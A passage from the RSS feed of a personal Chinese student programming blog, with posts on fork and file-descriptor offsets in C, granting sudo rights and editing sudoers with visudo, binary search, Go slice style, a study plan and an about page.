        redirect(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, p);
        loop();
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        redirect(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, p);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
            write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;i, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;));
        }
    }
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;经由&lt;code&gt;fork&lt;/code&gt;和&lt;code&gt;dup&lt;/code&gt;得到，的对同一文件的&lt;code&gt;fd&lt;/code&gt;, 它们共享偏移&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;fork&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(fork() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
	fprintf(stdout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello &amp;#34;&lt;/span&gt;);
	exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
	wait((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// wait child exit
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	fprintf(stdout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;world&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
	exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}

&lt;span style=&#34;color:#75715e&#34;&gt;// always get
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#34;hello world\n&amp;#34;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Editor for /etc/sudoer</title>
      <link>https://resyon.github.io/posts/sudoer-visudo/</link>
      <pubDate>Sat, 14 Aug 2021 14:26:34 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/sudoer-visudo/</guid>
      <description>新建用户，添加至sudo的若干步骤
usermod -aG root username 这时候，我在debian上依旧不行 (这是因为/etc/sudoer的配置中，并没有指定root用户组中的成员都可以使用sudo)
adduser useradd root 还是没用，选择直接编辑/etc/sudoer, 注意到这个文件的权限 通常使用sudoedit进行编辑， 这个时候如果出现语法错误，会非常蛋疼，查了资料后发现， visudo是个更好的选择，visudo不会在/etc/sudoer语法错误时拒绝编辑该文件，还会在保存后语法错误时提示重新编辑 </description>
      <content>&lt;p&gt;新建用户，添加至sudo的若干步骤&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;usermod -aG root username
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这时候，我在debian上依旧不行
(这是因为&lt;code&gt;/etc/sudoer&lt;/code&gt;的配置中，并没有指定&lt;code&gt;root&lt;/code&gt;用户组中的成员都可以使用&lt;code&gt;sudo&lt;/code&gt;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adduser useradd root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是没用，选择直接编辑&lt;code&gt;/etc/sudoer&lt;/code&gt;,
注意到这个文件的权限
&lt;img src=&#34;https://resyon.github.io/upload/2021/08/image-45acfb1b60e347239b1a19eaf23609bf.png&#34; alt=&#34;image.png&#34;&gt;
通常使用&lt;code&gt;sudoedit&lt;/code&gt;进行编辑， 这个时候如果出现语法错误，会非常蛋疼，查了&lt;a href=&#34;https://askubuntu.com/questions/73864/how-to-modify-an-invalid-etc-sudoers-file&#34;&gt;资料&lt;/a&gt;后发现，
&lt;code&gt;visudo&lt;/code&gt;是个更好的选择，&lt;code&gt;visudo&lt;/code&gt;不会在&lt;code&gt;/etc/sudoer&lt;/code&gt;语法错误时拒绝编辑该文件，还会在保存后语法错误时提示重新编辑
&lt;img src=&#34;2&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>数组</title>
      <link>https://resyon.github.io/posts/array/</link>
      <pubDate>Fri, 21 May 2021 07:56:13 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/array/</guid>
      <description>binary-search #include&amp;lt;vector&amp;gt;using namespace std; int search(vector&amp;lt;int&amp;gt;&amp;amp; nums, int target) { int i = 0, j = nums.size()-1; //这里的类型别用auto, 否则后续  //mid - 1 可能溢出  int mid; while (i &amp;lt;= j) { mid = (i + j ) / 2; if (nums[mid] == target) { return mid; }else if (nums[mid] &amp;gt; target)	j = mid-1; //注意此处 -1 	else i = mid+1; //以及此处 + 1  //否则容易陷入死循环 	} return -1; } </description>
      <content>&lt;h2 id=&#34;binary-searchhttpsleetcode-cncomproblemsbinary-search&#34;&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/binary-search/&#34;&gt;binary-search&lt;/a&gt;&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;(vector&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; nums, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; target) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nums.size()&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;//这里的类型别用auto, 否则后续
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                                &lt;span style=&#34;color:#75715e&#34;&gt;//mid - 1 可能溢出
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; mid;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; j) {
		mid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j ) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (nums[mid] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; target) {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; mid;
		}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (nums[mid] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; target)	j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mid&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;//注意此处 -1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mid&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;//以及此处 + 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;//否则容易陷入死循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>2022春招计划_阶段一</title>
      <link>https://resyon.github.io/posts/2022-spring-1/</link>
      <pubDate>Fri, 21 May 2021 00:39:42 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/2022-spring-1/</guid>
      <description>2022春招应该在2022年2，3月进行，现开始对此进行准备
 Summary 本学期课程主要为数学/算法类，且即将结束，故决定阶段一20210520-20210720系统掌握常见的算法类型
1.1 基础20210520-20210620 跟随leetcode-master, 数据结构出发
1.2 提升20210621-20210720 跟随labuladong掌握常见算法套路 选择性oi-wiki
2 日常20210721- leetcode每日一题</description>
      <content>&lt;blockquote&gt;
&lt;p&gt;2022春招应该在2022年2，3月进行，现开始对此进行准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;本学期课程主要为数学/算法类，且即将结束，故决定阶段一&lt;code&gt;20210520-20210720&lt;/code&gt;系统掌握常见的算法类型&lt;/p&gt;
&lt;h3 id=&#34;11-基础20210520-20210620&#34;&gt;1.1 基础&lt;code&gt;20210520-20210620&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;跟随&lt;a href=&#34;https://github.com/youngyangyang04/leetcode-master&#34;&gt;leetcode-master&lt;/a&gt;, 数据结构出发&lt;/p&gt;
&lt;h3 id=&#34;12-提升20210621-20210720&#34;&gt;1.2 提升&lt;code&gt;20210621-20210720&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;跟随&lt;a href=&#34;https://labuladong.gitee.io/algo/&#34;&gt;labuladong&lt;/a&gt;掌握常见算法套路
选择性&lt;a href=&#34;https://oi-wiki.org/&#34;&gt;oi-wiki&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-日常20210721-&#34;&gt;2 日常&lt;code&gt;20210721-&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;leetcode&lt;/code&gt;每日一题&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Golang切片使用风格</title>
      <link>https://resyon.github.io/posts/golang-slice/</link>
      <pubDate>Sun, 09 May 2021 21:54:38 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/golang-slice/</guid>
      <description>切片声明  此前特别喜欢用字面量声明一个切片, 即， slice := []int{} , 读了uber go 风格指南后发现，这样其实不大好
 此前总是那样做是担心声明的方式var slice []int，slice未初始化，
然而， 切片的默认值实际是有效的
切片默认值(nil)使用 </description>
      <content>&lt;h2 id=&#34;切片声明&#34;&gt;切片声明&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;此前特别喜欢用字面量声明一个切片,
即， &lt;code&gt;slice := []int{}&lt;/code&gt; ,
读了&lt;a href=&#34;https://github.com/gocn/translator/blob/master/2019/w38_uber_go_style_guide.md#zero-value-mutexes-are-valid&#34;&gt;uber go 风格指南&lt;/a&gt;后发现，这样其实不大好&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/05/image-4f1f94305ece4de2a7ee4f0c2281e518.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;此前总是那样做是担心声明的方式&lt;code&gt;var slice []int&lt;/code&gt;，&lt;code&gt;slice&lt;/code&gt;未初始化，&lt;/p&gt;
&lt;p&gt;然而， 切片的默认值实际是有效的&lt;/p&gt;
&lt;h2 id=&#34;切片默认值nil使用&#34;&gt;切片默认值(&lt;code&gt;nil&lt;/code&gt;)使用&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/05/image-d38fa7064a654779b21ba9e53a09a1b1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>About Resyon</title>
      <link>https://resyon.github.io/posts/about/</link>
      <pubDate>Sat, 08 May 2021 13:45:42 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/about/</guid>
      <description>About Me 关于我，普通的19级在校学生，惯用Golang/Java/C， 不大喜欢Python， 会整点web的后端开发，对中间件有些兴趣。业余看些动漫，人生没啥追求，唯一的愿望是快乐。
About Resyon&amp;rsquo;s World 关于本站，不会有多少访问量的个人博客，主要用于记录一些个人学习中的笔记，我喜欢halo这个博客系统的原因之一是使用体验不错，还是用java写的，这样哪天我想给它加些新功能会容易些，他的生态也不错，现在用的主题我颇为喜欢。</description>
      <content>&lt;h2 id=&#34;about-me&#34;&gt;About Me&lt;/h2&gt;
&lt;p&gt;关于我，普通的19级在校学生，惯用&lt;code&gt;Golang&lt;/code&gt;/&lt;code&gt;Java&lt;/code&gt;/&lt;code&gt;C&lt;/code&gt;， 不大喜欢&lt;code&gt;Python&lt;/code&gt;， 会整点&lt;code&gt;web&lt;/code&gt;的后端开发，对中间件有些兴趣。业余看些动漫，人生没啥追求，唯一的愿望是快乐。&lt;/p&gt;
&lt;h2 id=&#34;about-resyons-world&#34;&gt;About Resyon&amp;rsquo;s World&lt;/h2&gt;
&lt;p&gt;关于本站，不会有多少访问量的个人博客，主要用于记录一些个人学习中的笔记，我喜欢&lt;code&gt;halo&lt;/code&gt;这个博客系统的原因之一是使用体验不错，还是用&lt;code&gt;java&lt;/code&gt;写的，这样哪天我想给它加些新功能会容易些，他的生态也不错，现在用的主题我颇为喜欢。&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>See You Again</title>
      <link>https://resyon.github.io/posts/seeyouagain/</link>
      <pubDate>Thu, 06 May 2021 21:24:40 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/seeyouagain/</guid>
      <description>复活 原本不打算再写博客，一个是懒，另一个是确实也没啥好写的。 偶然的机会又得用上服务器，单挂个小程序的后端，看着资源利用率，觉得难受，于是这个博客又复活了,还换了个域名。 其实说起博客，更像是自娱自乐的地方，正如站名Resyon&#39;s World，到也无所谓了。
Next? 最近有点忙，一个小程序大赛，一个互联网+，但忙里偷闲也能干点自己觉得有意思的 对桌面环境之类的一直有点兴趣，最近研究一下
 X11 X-org Do-Chat/Wine  </description>
      <content>&lt;h2 id=&#34;复活&#34;&gt;复活&lt;/h2&gt;
&lt;p&gt;原本不打算再写博客，一个是懒，另一个是确实也没啥好写的。
偶然的机会又得用上服务器，单挂个小程序的后端，看着资源利用率，觉得难受，于是这个博客又复活了,还换了个域名。
其实说起博客，更像是自娱自乐的地方，正如站名&lt;code&gt;Resyon&#39;s World&lt;/code&gt;，到也无所谓了。&lt;/p&gt;
&lt;h2 id=&#34;next&#34;&gt;Next?&lt;/h2&gt;
&lt;p&gt;最近有点忙，一个小程序大赛，一个互联网+，但忙里偷闲也能干点自己觉得有意思的
对桌面环境之类的一直有点兴趣，最近研究一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;X11&lt;/li&gt;
&lt;li&gt;X-org&lt;/li&gt;
&lt;li&gt;Do-Chat/Wine&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
